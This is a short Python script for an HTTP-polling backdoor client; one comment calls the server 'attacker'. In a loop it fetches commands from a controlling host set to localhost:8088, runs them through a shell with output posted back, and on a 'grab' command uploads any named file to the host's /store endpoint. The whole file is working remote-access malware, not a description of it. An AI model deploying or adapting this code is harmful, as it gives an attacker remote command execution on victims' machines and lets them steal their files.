import http.client
import subprocess
import time
import requests
import os
IP = 'http://' + 'localhost' + ':8088'

while True:

    # Setup connection to attacker
    req = requests.get(IP)      # Send GET request to host machine
    command = req.text

    if command in {'terminate', 't'}:
        print("Terminating Connection")
        break

    elif 'grab' in command:
        grab, path = command.split('*')

        if os.path.exists(path):
            url = IP + '/store'  # Append /store in the URL
            # Add a dictionary key where file will be stored
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)  # Send the file
            # requests library use POST method called "multipart/form-data"
        else:
            post_response = requests.post(
                url=IP, data='[-] Not able to find the file !')
    else:
        print(f"Additional command {command}")
        CMD = subprocess.run(command, capture_output=True, shell=True)
        post_response = requests.post(
            url=IP, data=CMD.stdout.decode())
        post_response = requests.post(
            url=IP, data=CMD.stderr.decode())
    print(f"Status Code: {req.status_code}")
    time.sleep(1)
